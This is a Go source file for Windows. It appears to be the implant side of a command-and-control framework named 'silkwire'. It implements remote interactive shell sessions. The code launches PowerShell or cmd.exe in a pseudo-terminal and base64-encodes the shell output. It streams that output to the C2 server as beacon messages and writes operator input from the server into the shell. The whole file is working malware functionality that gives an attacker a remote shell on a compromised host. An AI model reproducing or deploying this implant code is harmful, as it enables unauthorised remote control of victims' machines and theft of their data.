//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"os/exec"
	"time"

	pty "github.com/aymanbagabas/go-pty"
	pb "silkwire/proto"
)

// Windows PTY Support using go-pty library
type ptySessionWindows struct {
	id  string
	pty pty.Pty
	cmd *pty.Cmd
}

var ptySessionsWindows = make(map[string]*ptySessionWindows)

// GetSystemShellPath returns the available system shell path, prioritizing PowerShell
func GetSystemShellPath() string {
	// Check for PowerShell first (preferred)
	powershellPaths := []string{
		"powershell.exe",
		"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe",
	}

	for _, path := range powershellPaths {
		if _, err := exec.LookPath(path); err == nil {
			return path
		}
	}

	// Fallback to cmd.exe
	cmdPaths := []string{
		"cmd.exe",
		"C:\\Windows\\System32\\cmd.exe",
		"C:\\Windows\\SysWOW64\\cmd.exe",
	}

	for _, path := range cmdPaths {
		if _, err := exec.LookPath(path); err == nil {
			return path
		}
	}

	// Last resort
	return "cmd.exe"
}

// StartPTY starts a new PTY session on Windows using go-pty
func (i *Implant) StartPTY(stream pb.C2Service_BeaconStreamClient, cmd *pb.CommandMessage) error {
	shell := cmd.Command
	if shell == "" {
		shell = GetSystemShellPath()
	}

	if DebugMode {
		log.Printf("Starting PTY session with shell: %s, command ID: %s", shell, cmd.CommandId)
	}

	// Parse size
	cols, rows := 80, 25
	if len(cmd.Args) >= 2 {
		fmt.Sscanf(cmd.Args[0], "%d", &cols)
		fmt.Sscanf(cmd.Args[1], "%d", &rows)
	}

	if DebugMode {
		log.Printf("PTY size: %dx%d", cols, rows)
	}

	// Create PTY using go-pty
	p, err := pty.New()
	if err != nil {
		return fmt.Errorf("failed to create PTY: %v", err)
	}

	// Create command in the PTY
	c := p.Command(shell)
	
	// Start the shell process
	err = c.Start()
	if err != nil {
		p.Close()
		return fmt.Errorf("failed to start shell: %v", err)
	}

	// Set PTY size if supported
	if err := p.Resize(cols, rows); err != nil && DebugMode {
		log.Printf("Failed to set PTY size: %v", err)
	}

	// Create session
	session := &ptySessionWindows{
		id:  cmd.CommandId,
		pty: p,
		cmd: c,
	}

	ptySessionsWindows[cmd.CommandId] = session

	// Start output reader goroutine
	go i.readPTYOutputWindows(session, stream)

	// Start process monitor goroutine
	go i.monitorProcessWindows(session, stream)

	if DebugMode {
		log.Printf("PTY session started successfully, command ID: %s", cmd.CommandId)
	}

	return nil
}

// readPTYOutputWindows reads output from the PTY and sends it via beacon
func (i *Implant) readPTYOutputWindows(session *ptySessionWindows, stream pb.C2Service_BeaconStreamClient) {
	if DebugMode {
		log.Printf("Starting PTY output reader for session: %s", session.id)
	}

	buf := make([]byte, 4096)
	for {
		n, err := session.pty.Read(buf)
		if n > 0 {
			if DebugMode {
				log.Printf("Read %d bytes from PTY: %q", n, string(buf[:n]))
			}
			b64 := base64.StdEncoding.EncodeToString(buf[:n])
			bm := &pb.BeaconMessage{
				ImplantId:    i.ID,
				SessionToken: i.SessionToken,
				Timestamp:    time.Now().Unix(),
				Type:         pb.BeaconMessage_PTY_OUTPUT,
				Payload:      []byte(fmt.Sprintf("%s|%s", session.id, b64)),
			}
			if err := stream.Send(bm); err != nil {
				if DebugMode {
					log.Printf("Failed to send PTY output: %v", err)
				}
				break
			}
		}
		if err != nil {
			if err != io.EOF && DebugMode {
				log.Printf("PTY output reader error: %v", err)
			}
			break
		}
	}

	if DebugMode {
		log.Printf("PTY output reader exiting for session: %s", session.id)
	}
}

// monitorProcessWindows monitors the process and sends exit notification
func (i *Implant) monitorProcessWindows(session *ptySessionWindows, stream pb.C2Service_BeaconStreamClient) {
	if session.cmd == nil {
		return
	}

	// Wait for process to exit
	err := session.cmd.Wait()
	exitCode := 0
	if err != nil {
		exitCode = 1
	}

	// Send exit notification
	bm := &pb.BeaconMessage{
		ImplantId:    i.ID,
		SessionToken: i.SessionToken,
		Timestamp:    time.Now().Unix(),
		Type:         pb.BeaconMessage_PTY_EXIT,
		Payload:      []byte(fmt.Sprintf("%s|%d", session.id, exitCode)),
	}
	stream.Send(bm)

	// Cleanup
	i.StopPTY(session.id)
}

// FeedPTYInput feeds input to a PTY session
func (i *Implant) FeedPTYInput(commandID string, data []byte) {
	session, ok := ptySessionsWindows[commandID]
	if !ok {
		if DebugMode {
			log.Printf("FeedPTYInput: session not found for %s", commandID)
		}
		return
	}

	// Data is base64 from server
	decoded, err := base64.StdEncoding.DecodeString(string(data))
	if err != nil {
		if DebugMode {
			log.Printf("FeedPTYInput: base64 decode error: %v", err)
		}
		return
	}

	if DebugMode {
		log.Printf("FeedPTYInput: received %d bytes: %q", len(decoded), string(decoded))
	}

	n, err := session.pty.Write(decoded)
	if DebugMode {
		log.Printf("FeedPTYInput: wrote %d bytes to PTY, error: %v", n, err)
	}
}

// ResizePTY resizes a PTY session
func (i *Implant) ResizePTY(commandID string, args []string) {
	session, ok := ptySessionsWindows[commandID]
	if !ok {
		return
	}

	cols, rows := 80, 25
	if len(args) >= 2 {
		fmt.Sscanf(args[0], "%d", &cols)
		fmt.Sscanf(args[1], "%d", &rows)
	}

	err := session.pty.Resize(cols, rows)
	if DebugMode && err != nil {
		log.Printf("Failed to resize PTY: %v", err)
	}
}

// StopPTY stops a PTY session
func (i *Implant) StopPTY(commandID string) {
	session, ok := ptySessionsWindows[commandID]
	if !ok {
		return
	}

	session.pty.Close()
	delete(ptySessionsWindows, commandID)

	if DebugMode {
		log.Printf("PTY session stopped: %s", commandID)
	}
}